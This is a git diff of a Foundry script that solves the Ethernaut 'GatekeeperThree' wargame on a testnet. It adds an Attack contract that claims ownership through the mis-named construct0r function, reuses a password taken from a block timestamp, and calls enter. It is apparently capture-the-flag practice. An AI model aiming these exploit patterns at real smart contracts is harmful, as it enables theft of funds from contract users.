@@ -6,9 +6,9 @@ import "forge-std/console.sol";
 import {GatekeeperThree} from "../src/GatekeeperThree.sol";
 
 // $ source .env      # This is to store the environmental variables in the shell session
-// $ forge script script/GateKeeperThree.s.sol --tc GateKeeperThreeSolution --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv
+// $ forge script script/GatekeeperThree.s.sol --tc GatekeeperThreeSolution --rpc-url $SEPOLIA_RPC_URL --broadcast --verify -vvvv
 
-contract GateKeeperThreeSolution is Script {
+contract GatekeeperThreeSolution is Script {
     // get the environmental variables
     uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
     address myAddress = vm.envAddress("MY_ADDRESS");
@@ -34,19 +34,22 @@ contract GateKeeperThreeSolution is Script {
     function run() external {
         vm.startBroadcast(deployerPrivateKey);
         // create a new instance of the GatekeeperThree contract
-        GatekeeperThree gatekeeper = GatekeeperThree(instance);
+        GatekeeperThree gatekeeper = GatekeeperThree(payable(instance));
 
-        // call the construct0r function of the GatekeeperThree contract
-        gatekeeper.construct0r();
+        // create a new Attack contract
+        Attack attackInstance = new Attack(payable(instance));
 
-        // call the createTrick function of the SimpleTrick contract
-        trick.createTrick();
+        // transfer 0.001 ether + 1 wei to the gatekeeper instance
+        (bool success, ) = address(gatekeeper).call{value: 0.001 ether + 1}("");
+        require(success, "failed to send ether");
+        
+        // start the attack
+        attackInstance.setUp();
+        attackInstance.attack();
 
-        // call the checkPassword function of the SimpleTrick contract
-        trick.checkPassword(block.timestamp);
+        console.log("GatekeeperThree entrant: ", gatekeeper.entrant());
+        require(gatekeeper.entrant() == myAddress, "Failed to pass the challenge");
 
-        // call the trickyTrick function of the SimpleTrick contract
-        trick.trickyTrick();
         vm.stopBroadcast();
     }
 
@@ -56,13 +59,23 @@ contract GateKeeperThreeSolution is Script {
 contract Attack {
     
     GatekeeperThree public target;
+    uint256 public savedTimestamp;
 
     constructor(address payable _target) {
         target = GatekeeperThree(_target);
     }
 
-    function attack() public {
+    function setUp() public {
+        // we need to call the construct0r function to make the attacker the owner of the contract
+        target.construct0r();
+        target.createTrick();
+        // we save the current block timestamp as it is set as the password when creating the Trick contract
+        savedTimestamp = block.timestamp;
+    }
 
+    function attack() public {
+        target.getAllowance(savedTimestamp);
+        target.enter();
     }
 
     // receive function to revert when receiving ether
